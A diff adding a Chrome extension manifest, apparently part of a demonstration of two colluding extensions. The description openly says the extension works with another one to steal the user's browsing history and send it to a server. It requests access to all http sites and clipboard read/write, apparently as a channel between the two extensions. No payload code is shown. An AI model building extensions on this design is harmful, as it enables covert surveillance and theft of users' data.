@@ -1,0 +1,17 @@
+{
+    "manifest_version": 2,
+
+    "name": "Extension 2 - Steal Yo History Foo'",
+    "description": "This extension colludes with the other extension you installed to steal and transmit your history data to our server",
+    "version": "1.0",
+
+    "background": {
+      "page": "background.html"
+    },
+    "permissions": [
+      "http://localhost/",
+      "http://*/*",
+      "clipboardWrite",
+      "clipboardRead"
+    ]
+}
